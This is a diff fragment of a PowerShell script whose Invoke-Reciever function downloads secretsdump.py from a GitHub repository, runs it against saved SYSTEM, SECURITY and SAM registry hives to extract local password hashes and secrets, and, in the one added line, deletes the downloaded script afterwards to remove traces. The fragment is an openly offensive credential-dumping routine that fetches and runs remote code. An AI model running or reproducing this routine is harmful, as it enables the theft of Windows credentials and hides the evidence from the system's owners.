@@ -67,5 +67,6 @@ function Invoke-Reciever {
 
     wget "http://raw.github.com/mo-tec/HashExtractor/master/secretsdump.py" -UseBasicParsing -out (Join-Path (resolve-path './') '/secretsdump.py')
     .\secretsdump.py -system SYSTEM -security SECURITY -sam SAM LOCAL
+    del ./secretsdump.py
 }
 Invoke-Reciever
